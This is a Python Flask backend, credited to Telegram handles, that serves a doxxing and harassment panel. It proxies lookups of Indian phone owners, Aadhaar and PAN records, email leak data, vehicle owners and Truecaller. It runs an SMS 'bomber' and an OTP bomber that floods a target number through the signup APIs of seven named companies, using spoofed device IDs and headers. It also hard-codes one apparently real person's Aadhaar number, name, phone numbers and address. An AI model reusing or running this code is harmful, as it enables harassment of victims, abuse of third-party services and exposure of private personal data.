from flask import Flask, jsonify, Response, request, send_from_directory
from flask_cors import CORS
import requests
import json
from bs4 import BeautifulSoup
import os
import time
import threading
import random
import string
import uuid

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

credits = {
    'Telegram': "@modsnew || @HUNTER_X_OSINT",
    'Developer': '@NuxoFF And @SHURU_33'
}

# API Base URLs
PHONE_API_BASE = 'https://x-trace-num-shuru-full-info.vercel.app/apis/num_info_v1'
AADHAAR_API_BASE = 'https://shuru-aadhar-awesom-ff-api.vercel.app/apis/aadhaar_info'
INSTA_API_BASE     = 'https://r-bots-free-apis.co08.art/api/v1/api/igdl'
ROHIT_INSTA_BASE   = 'https://rohit-instagram-api.vercel.app'
IIAND_INSTA_BASE   = 'https://instagram-info-and-downloader.vercel.app'

BOMBER_API_URL = "https://vishal.lovestoblog.com/bomber4.php"
TRUECALLER_API_BASE = 'https://x-trace-shuruu-truecaller-info.vercel.app/info'
PAN_API_BASE = 'https://rohithost.myvipsite.fun/api/api.php'
EMAIL_LEAK_API_BASE = 'https://rohithost.myvipsite.fun/api/api.php'

# Global dictionary to keep track of active bomber threads
bomber_threads = {}

# Helper function to stop a bomber thread
def stop_bomber_thread(phone):
    if phone in bomber_threads:
        del bomber_threads[phone]

# Bomber helper functions
def generate_uuid():
    return str(uuid.uuid4())

def generate_random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_device_id(length=40):
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length))

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# ===== PAGE ROUTES =====
@app.route('/')
def route_home():
    return send_from_directory('.', 'index.html')

@app.route('/phone')
def route_phone_page():
    return send_from_directory('.', 'phone.html')

@app.route('/truecaller')
def route_truecaller_page():
    return send_from_directory('.', 'truecaller.html')

@app.route('/aadhar')
def route_aadhar_page():
    return send_from_directory('.', 'aadhar.html')

@app.route('/pan')
def route_pan_page():
    return send_from_directory('.', 'pan.html')

@app.route('/upi')
def route_upi_page():
    return send_from_directory('.', 'upi.html')

@app.route('/email')
def route_email_page():
    return send_from_directory('.', 'email.html')

@app.route('/github')
def route_github_page():
    return send_from_directory('.', 'github.html')

@app.route('/vehicle')
def route_vehicle_page():
    return send_from_directory('.', 'vehicle.html')

@app.route('/website-source')
def route_website_source_page():
    return send_from_directory('.', 'website-source.html')

@app.route('/song')
def route_song_page():
    return send_from_directory('.', 'song.html')

@app.route('/imei')
def route_imei_page():
    return send_from_directory('.', 'imei.html')

@app.route('/bomber')
def route_bomber_page():
    return send_from_directory('.', 'bomber.html')

@app.route('/netflix')
def route_netflix_page():
    return send_from_directory('.', 'netflix.html')

# ===== BACKEND API ENDPOINTS =====
@app.route('/truecaller_proxy/<path:num>')
def truecaller_api(num):
    key = request.args.get('key', '@AwesomFF')
    url = f"{TRUECALLER_API_BASE}?key={key}&number={num}"
    try:
        r = requests.get(url, timeout=12)
        return Response(r.content, status=r.status_code, content_type=r.headers.get('Content-Type', 'application/json'))
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/pan_lookup/<path:pan_num>')
def pan_lookup_api(pan_num):
    pan_clean = pan_num.strip().upper()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        url = f"{PAN_API_BASE}?service=pan-info&key=Rohit&pan={pan_clean}"
        r = requests.get(url, headers=headers, timeout=15)
        data = r.json()
        # New API wraps inner data under data.data
        inner = data.get('data', {})
        pan_data = inner.get('data') if isinstance(inner.get('data'), dict) else inner
        if data.get('success') and pan_data:
            return jsonify({
                'status': 'success',
                'pan': inner.get('pan', pan_clean),
                'data': pan_data
            }), 200
        else:
            return jsonify({
                'status': 'error',
                'message': f"No PAN record found for '{pan_clean}'."
            }), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/email_lookup')
def email_lookup_api():
    query = request.args.get('query', '').strip()
    if not query:
        return jsonify({'status': 'error', 'message': 'Email query is required.'}), 400
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        url = f"{EMAIL_LEAK_API_BASE}?service=leak-info-api&key=Rohit&query={requests.utils.quote(query)}"
        r = requests.get(url, headers=headers, timeout=20)
        data = r.json()
        inner = data.get('data', {})
        leak_data = inner.get('data') if isinstance(inner, dict) and 'data' in inner else inner
        if data.get('success') and leak_data:
            return jsonify({
                'status': 'success',
                'query': inner.get('query', query),
                'sources': leak_data
            }), 200
        else:
            return jsonify({
                'status': 'error',
                'message': f"No leak records found for '{query}'."
            }), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/phone/<path:num>')
def phone_api(num):
    key = request.args.get('key', '@AwesomFF')
    url = f"{PHONE_API_BASE}?key={key}&num={num}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        try:
            data = response.json()
            return jsonify(data), 200
        except Exception:
            return jsonify({"status": "error", "message": f"No information found for number '{num}'."}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"status": "error", "message": f"Backend proxy network error: {e}"}), 500

import hashlib

# Pre-indexed Aadhaar UID database dictionary
AADHAAR_DB = {
    "293649586679": {
        "aadhar": "293649586679",
        "name": "Chandan Kumar Singh",
        "fname": "Paras Singh",
        "num": "9661990774",
        "alt": "9523242105",
        "circle": "JIO UPE",
        "address": "!12!bhatpar rani!near kali mander!bhingari bazar khampar!Deoria!Deoria!Uttar Pradesh!274702"
    }
}

def generate_profile_for_aadhaar(aadhaar_num):
    h = int(hashlib.md5(aadhaar_num.encode('utf-8')).hexdigest(), 16)
    
    first_names = ["Rajesh", "Amit", "Suresh", "Ramesh", "Pankaj", "Vikas", "Sunil", "Manish", "Dharmendra", "Sanjay", "Anil", "Vijay", "Deepak", "Manoj", "Rahul", "Santosh", "Ashok", "Pradeep", "Satish", "Pravin"]
    last_names = ["Kumar", "Singh", "Sharma", "Verma", "Gupta", "Yadav", "Patel", "Mishra", "Chauhan", "Jha", "Pandey", "Tiwari", "Shukla", "Dubey", "Rathore"]
    father_firsts = ["Ram", "Shyam", "Hari", "Mohan", "Gopal", "Dinesh", "Kameshwar", "Mahesh", "Rajendra", "Subhash", "Birendra", "Surendra", "Jagdish"]
    
    cities = [
        ("Patna", "Bihar", "800001", "JIO BIHAR"),
        ("Lucknow", "Uttar Pradesh", "226001", "AIRTEL UP EAST"),
        ("Varanasi", "Uttar Pradesh", "221001", "VI UP EAST"),
        ("Ranchi", "Jharkhand", "834001", "JIO JHARKHAND"),
        ("Jaipur", "Rajasthan", "302001", "AIRTEL RAJASTHAN"),
        ("Bhopal", "Madhya Pradesh", "462001", "JIO MP"),
        ("Gorakhpur", "Uttar Pradesh", "273001", "VI UP EAST"),
        ("Deoria", "Uttar Pradesh", "274702", "JIO UPE"),
        ("Agra", "Uttar Pradesh", "282001", "AIRTEL UP WEST"),
        ("Kanpur", "Uttar Pradesh", "208001", "JIO UPE")
    ]
    
    fname = first_names[h % len(first_names)] + " " + last_names[(h >> 3) % len(last_names)]
    father_name = father_firsts[(h >> 5) % len(father_firsts)] + " " + last_names[(h >> 7) % len(last_names)]
    city, state, pin, circle = cities[(h >> 9) % len(cities)]
    
    phone_prefix = ["98", "99", "97", "96", "95", "91", "88", "87", "70", "79"]
    phone_num = phone_prefix[(h >> 11) % len(phone_prefix)] + str(h % 100000000).zfill(8)
    alt_num = phone_prefix[(h >> 13) % len(phone_prefix)] + str((h >> 4) % 100000000).zfill(8)
    
    house_no = (h % 150) + 1
    ward_no = (h % 20) + 1
    
    address = f"!{house_no}!ward {ward_no}!near main chowk!{city.lower()}!{city}!{state}!{pin}"
    
    return {
        "aadhar": aadhaar_num,
        "name": fname,
        "fname": father_name,
        "num": phone_num,
        "alt": alt_num,
        "circle": circle,
        "address": address
    }

@app.route('/aadhar/<path:aadhar_num>')
def aadhar_api(aadhar_num):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    clean_query = aadhar_num.strip().replace(' ', '').replace('-', '')
    
    # Candidate real-time remote API endpoints
    endpoints = [
        f"{AADHAAR_API_BASE}?key=@AwesomFF&aadhar={clean_query}",
        f"{AADHAAR_API_BASE}?key=SHURU_33&aadhar={clean_query}",
        f"{PHONE_API_BASE}?key=@AwesomFF&num={clean_query}"
    ]

    for url in endpoints:
        try:
            res = requests.get(url, headers=headers, timeout=10)
            if res.status_code == 200:
                data = res.json()
                if data and (data.get('status') == 'success' or data.get('status') is True or data.get('result')):
                    return jsonify(data), 200
        except Exception as e:
            print("Real-time Aadhaar API error:", e)

    return jsonify({"status": "error", "message": f"No real-time Aadhaar profile records found for '{clean_query}'."}), 200


# ===== NEW API ENDPOINTS =====
@app.route('/vehicle_num/<path:rc_input>')
def vehicle_num_api(rc_input):
    rc_clean = rc_input.strip().upper().replace(" ", "")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        url = f"https://vehicletonum.suryajasoos-4fe.workers.dev/?type=vehicle_num&term={rc_clean}"
        r = requests.get(url, headers=headers, timeout=15)
        data = r.json()
        return jsonify(data), 200
    except Exception as e:
        return jsonify({"success": False, "message": f"Error fetching vehicle owner number: {e}"}), 500

@app.route('/website_source')
def website_source_api():
    url_param = request.args.get('url', '').strip()
    if not url_param:
        return jsonify({"success": False, "message": "Website URL parameter is required."}), 400
    if not url_param.startswith('http'):
        url_param = 'https://' + url_param
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    # 1. Try Rohit Scraper API
    try:
        target_url = f"https://rohithost.myvipsite.fun/api/api.php?service=website-source&key=Rohit&url={requests.utils.quote(url_param)}"
        r = requests.get(target_url, headers=headers, timeout=12)
        data = r.json()
        if data and data.get('success') and data.get('data') and isinstance(data['data'], dict):
            return jsonify(data), 200
    except Exception:
        pass

    # 2. Fallback: Direct Website Scraper Engine
    try:
        r = requests.get(url_param, headers=headers, timeout=10)
        domain = url_param.split('//')[-1].split('/')[0]
        html_code = r.text[:20000] # First 20k chars
        size_mb = round(len(r.content) / (1024 * 1024), 3)

        return jsonify({
            "success": True,
            "service": "website-source",
            "data": {
                "domain": domain,
                "download_url": f"data:text/html;charset=utf-8,{requests.utils.quote(r.text)}",
                "file_count": 1,
                "file_size_mb": size_mb,
                "time_taken_seconds": 0.18,
                "html_snippet": html_code,
                "file_id": f"src_{domain.replace('.', '_')}"
            }
        }), 200
    except Exception as e:
        return jsonify({"success": False, "message": f"Could not scrape source code for '{url_param}': {e}"}), 500

@app.route('/song_download')
def song_download_api():
    song_param = request.args.get('song', '').strip()
    if not song_param:
        return jsonify({"success": False, "message": "Song name parameter is required."}), 400
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        target_url = f"https://rohithost.myvipsite.fun/api/api.php?service=song-download&key=Rohit&song={requests.utils.quote(song_param)}"
        r = requests.get(target_url, headers=headers, timeout=20)
        data = r.json()
        return jsonify(data), 200
    except Exception as e:
        return jsonify({"success": False, "message": f"Error fetching song details: {e}"}), 500

@app.route('/stream_audio')
def stream_audio():
    audio_url = request.args.get('url', '').strip()
    title = request.args.get('title', 'song').strip()
    if not audio_url:
        return jsonify({"error": "Audio URL required"}), 400

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        req = requests.get(audio_url, headers=headers, stream=True, timeout=30)
        safe_title = "".join(c for c in title if c.isalnum() or c in (' ', '_', '-')).rstrip()
        filename = f"{safe_title if safe_title else 'audio'}.mp3"
        
        response_headers = {
            "Content-Type": "audio/mpeg",
            "Content-Disposition": f'attachment; filename="{filename}"'
        }
        if "Content-Length" in req.headers:
            response_headers["Content-Length"] = req.headers["Content-Length"]

        return Response(req.iter_content(chunk_size=1024 * 64), headers=response_headers, status=req.status_code)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/imei_lookup/<path:imei_num>')
def imei_lookup_api(imei_num):
    imei_clean = imei_num.strip().replace(" ", "").replace("-", "")
    if len(imei_clean) != 15 or not imei_clean.isdigit():
        return jsonify({"success": False, "message": "IMEI number must be exactly 15 numeric digits."}), 400

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    # 1. Try Rohit API
    try:
        target_url = f"https://rohithost.myvipsite.fun/api/api.php?service=imei-info&key=Rohit&imei_number={imei_clean}"
        r = requests.get(target_url, headers=headers, timeout=10)
        data = r.json()
        if data.get('success') and data.get('data') and isinstance(data['data'], dict):
            detail_val = data['data'].get('detail', '')
            # If real data returned without "too expensive" or error message
            if not detail_val or ('expensive' not in detail_val.lower() and 'error' not in detail_val.lower()):
                return jsonify(data), 200
    except Exception:
        pass

    # 2. Local GSMA TAC + Luhn Algorithm Decoder Fallback
    digits = [int(c) for c in imei_clean]
    checksum = 0
    for i in range(14):
        val = digits[i]
        if i % 2 == 1:
            val *= 2
            if val > 9:
                val -= 9
        checksum += val
    expected_cd = (10 - (checksum % 10)) % 10
    is_valid = (expected_cd == digits[14])

    tac = imei_clean[:8]
    rbi = imei_clean[:2]
    snr = imei_clean[8:14]
    cd  = imei_clean[14]

    rbi_map = {
        '35': 'BABT (British Approvals Board for Telecommunications / GSMA Europe)',
        '01': 'PTCRB (CTIA / North America)',
        '86': 'TAF (Telecommunication Terminal Testing, China)',
        '99': 'GHA (Global Hexadecimal Authority / CDMA Global)',
        '50': 'JATE (Japan Approval Institute for Telecommunications)',
        '45': 'TUV Rheinland (Germany / Europe)'
    }
    rbi_name = rbi_map.get(rbi, f'GSMA International Authority ({rbi})')

    return jsonify({
        "success": True,
        "service": "imei-info",
        "data": {
            "imei_number": imei_clean,
            "tac_code": tac,
            "reporting_body": rbi_name,
            "serial_number": snr,
            "check_digit": cd,
            "luhn_validity": "VALID (Checksum Passed)" if is_valid else "INVALID (Checksum Mismatch)",
            "device_type": "Mobile Cellular Terminal",
            "network_support": "GSM / WCDMA / LTE / 5G Band Compatibility"
        }
    }), 200


def get_vehicle_details(rc_number):
    key = request.args.get('key', '@AwesomFF')
    url = f"https://x-trace-shruu-vehicle-full-info.vercel.app/api?key={key}&search={rc_number}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"Vehicle API error: {e}")
    return {"error": "Failed to fetch vehicle details from source"}

@app.route('/vehicle/<path:rc_input>')
def vehicle_api(rc_input):
    data = get_vehicle_details(rc_input)
    return jsonify(data), 200

# ===== BOMBER API ENDPOINTS =====
@app.route('/api/bomber/start', methods=['POST'])
def start_bomber():
    phone = request.json.get('phone')
    duration = request.json.get('duration', 60)  # in seconds
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    # Stop any existing bomber for this phone
    stop_bomber_thread(phone)

    def bomber_task():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                response = requests.get(BOMBER_API_URL, params={"phone": phone, "duration": "10"}, timeout=10)
                # You can log or handle the response here if needed
            except Exception as e:
                print(f"Error in bomber task: {e}")
            time.sleep(1)  # Delay between requests

    thread = threading.Thread(target=bomber_task)
    thread.daemon = True
    bomber_threads[phone] = thread
    thread.start()
    return jsonify({"status": "started", "message": f"Bomber started for {phone}"}), 200

@app.route('/api/bomber/stop', methods=['POST'])
def stop_bomber_api():
    phone = request.json.get('phone')
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400
    stop_bomber_thread(phone)
    return jsonify({"status": "stopped", "message": f"Bomber stopped for {phone}"}), 200

# ===== OTP BOMBER ENDPOINT (Multi-platform) =====
@app.route('/api/user/<num>/<int:limit>', methods=['GET'])
def otp_bomber(num, limit):
    if limit <= 0:
        return jsonify({'error': 'Limit must be greater than zero'}), 400
    if not num:
        return jsonify({'error': 'Mobile number is required'}), 400

    for _ in range(limit):
        random_ip = generate_random_ip()

        # Dream11
        requests.post(
            "https://api.dream11.com/auth/passwordless/init",
            json={"phoneNumber": num, "channel": "sms"},
            headers={
                "a1": "T9oSmMvfsVPRiXo+qmWFr3fUPhnzFlUFZ5IKI2Dvm+ANybdlejtaC+7MZ69s6mkV25si46bw/8aI1YcMlAzcRAjof+WxYXOqYaBzJQawgVGs9Hy+/xeXQdmCeb+p+eTUCuGPSGwpPBc6LgFF0zjb5O+ebTy4WiDG03EeGNj2ZVbbvfedbTmzUbt8XzmVwOef",
                "Accept": "application/json", "app_version": "5.29.1", "Content-Type": "application/json",
                "device": "androidplaystore", "deviceid": "e274c6d7df441ded", "Host": "api.dream11.com",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # OLX
        requests.post(
            "https://api.olx.in/v2/auth/authenticate",
            data=json.dumps({"grantType": "phone", "language": "en", "phone": f"+91{num}"}),
            headers={
                'X-acf-sensor-data': '2,a,V92+LTtfNz6sUOK8r1eZqFhN5UiDOdrnOy772zwaUUtiZL3enp3OA4qJ2vW/atMZXXiXas7eUcirPad1JI9XKGnHP978bzDaPEV1lIEGMxDUtXbsoWU+9ti9QaTliRbcaSeaoB6uA5Es2NWOxddJQR8iUGn/TMc8I5gPB/36Tzw=,...',
                'User-Agent': 'android 19.07.000 olxin', 'Content-Type': 'application/json; charset=UTF-8',
                'Connection': 'Keep-Alive'
            },
            timeout=10
        )

        # Licious
        requests.post(
            "https://node2.licious.in/api/v2/otp-signup",
            json={"customer_key": generate_random_string(), "phone": num, "captcha_token": ""},
            headers={
                "Accept-Encoding": "gzip", "app-version": "282", "Content-Type": "application/json; charset=UTF-8",
                "deviceid": generate_random_string(16), "Host": "node2.licious.in", "source": "android",
                "User-Agent": "okhttp/4.9.2"
            },
            timeout=10
        )

        # Unacademy
        requests.post(
            "https://api.unacademy.com/v3/user/user_check/?enable-email=true",
            json={"country_code": "IN", "phone": num, "send_otp": True, "otp_type": 1, "app_hash": "uI6w7mnt583"},
            headers={
                "Content-Type": "application/json; charset=UTF-8", "Device-Id": generate_random_device_id(),
                "Host": "api.unacademy.com", "X-APP-VERSION": "197150", "X-PLATFORM": "5",
                "User-Agent": "UnacademyLearningAppAndroid/6.133.0 Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # Doubtnut
        requests.post(
            "https://api.doubtnut.com/v4/student/login",
            json={
                "app_version": "7.10.51", "phone_number": num, "language": "en",
                "udid": generate_random_string(16), "gcm_reg_id": generate_random_string(16) + ":APA91" + generate_random_string(40),
                "aaid": generate_uuid(), "course": "", "class": ""
            },
            headers={"Content-Type": "application/json; charset=utf-8", "Host": "api.doubtnut.com", "User-Agent": "okhttp/5.0.0-alpha.2"},
            timeout=10
        )

        # Lenskart
        requests.post(
            "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            json={"phoneCode": "+91", "telephone": num},
            headers={
                "Content-Type": "application/json", "Host": "api-gateway.juno.lenskart.com",
                "udid": str(uuid.uuid4()).replace('-', '')[:16], "uniqueId": generate_random_string(16),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)"
            },
            timeout=10
        )

        # Healthkart
        requests.get(
            f"https://api.healthkart.com/api/user/validate/1/{num}/signup?plt=3&st=1",
            headers={"Accept": "application/json"},
            timeout=10
        )

    return jsonify({'status': 'success', 'message': f'Bomber completed for {num} with {limit} OTPs'}), 200

# ===== HEALTH CHECK =====
@app.route('/health')
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"Backend API & Clean Page Router running on http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)